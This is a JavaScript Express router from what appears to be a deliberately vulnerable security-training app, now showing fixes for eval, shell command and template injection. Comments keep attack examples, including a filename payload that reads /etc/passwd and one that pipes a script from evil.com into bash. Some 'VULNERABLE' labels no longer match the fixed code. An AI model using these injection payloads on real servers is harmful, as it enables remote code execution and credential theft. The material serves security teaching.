// ============================================================
// VULNERABILITY #12: Insecure Deserialization + Command Injection (CWE-502 / CWE-78)
// Attacker can execute arbitrary commands through unsafe eval/deserialization
// ============================================================

const express = require('express');
const router = express.Router();
const { execSync } = require('child_process');
const escape = require('lodash.escape');

// Helper function to safely parse filter expressions as JSON
function safeParseFilter(filter) {
  // Accept only JSON formatted strings as filter expressions
  // This avoids using eval and prevents remote code execution
  try {
    return JSON.parse(filter);
  } catch (error) {
    throw new Error('Invalid filter format. Expected JSON string.');
  }
}

// POST /api/export/query
// Body: { "filter": "{\"amount\": {\"$gt\": 1000}}" }
router.post('/query', (req, res) => {
  const { filter, format } = req.body;

  if (!filter) {
    return res.status(400).json({ error: 'Filter expression is required' });
  }

  try {
    // FIXED: Replaced unsafe eval() with safe JSON.parse to prevent Remote Code Execution (CWE-502)
    // Only allow JSON formatted filter expressions
    const parsedFilter = safeParseFilter(filter);

    // Simulate filtered data export
    const mockData = [
      { id: 1, account: 'ACC-001', amount: 5000, date: '2026-01-15' },
      { id: 2, account: 'ACC-002', amount: 12000, date: '2026-01-20' },
      { id: 3, account: 'ACC-003', amount: 800, date: '2026-02-01' },
    ];

    res.json({
      format: format || 'json',
      results: mockData,
      filter_applied: JSON.stringify(parsedFilter),
    });
  } catch (err) {
    res.status(400).json({ error: `Invalid filter expression: ${err.message}` });
  }
});

// VULNERABLE: Command Injection in PDF export via filename
// GET /api/export/pdf?filename=report;cat /etc/passwd
router.get('/pdf', (req, res) => {
  const { filename } = req.query;
  const reportNameRaw = filename || 'transaction-report';

  // FIX: Sanitize input by allowing only alphanumeric, dash, and underscore characters
  const reportName = reportNameRaw.replace(/[^a-zA-Z0-9-_]/g, ''); // Fix: sanitize filename to prevent command injection

  try {
    // VULNERABLE: User input directly in shell command
    // Attacker: ?filename=report;curl http://evil.com/shell.sh|bash
    const command = `echo "Generating PDF: ${reportName}" && date`;
    const output = execSync(command, { encoding: 'utf-8', timeout: 5000 });

    res.json({
      success: true,
      message: `PDF export initiated for: ${reportName}`,
      debug: output,
    });
  } catch (err) {
    res.status(500).json({ error: `Export failed: ${err.message}` });
  }
});

// FIXED: Removed new Function usage to mitigate Server-Side Template Injection
// POST /api/export/custom
router.post('/custom', (req, res) => {
  const { template, data } = req.body;

  if (!template) {
    return res.status(400).json({ error: 'Template string is required' });
  }

  try {
    // FIX: Use a safe templating approach by escaping the data and simple mustache-like replacement
    // Prevents arbitrary code execution by not using new Function() or eval()
    let safeTemplate = template;
    // Simple {{key}} replacement - escape inserted values
    const rendered = safeTemplate.replace(/{{\s*([\w]+)\s*}}/g, (match, p1) => {
      if (data && p1 in data) {
        return escape(String(data[p1])); // Escape to prevent XSS even on server output
      }
      return match;
    });

    res.json({ rendered });
  } catch (err) {
    res.status(400).json({ error: `Template error: ${err.message}` });
  }
});

module.exports = router;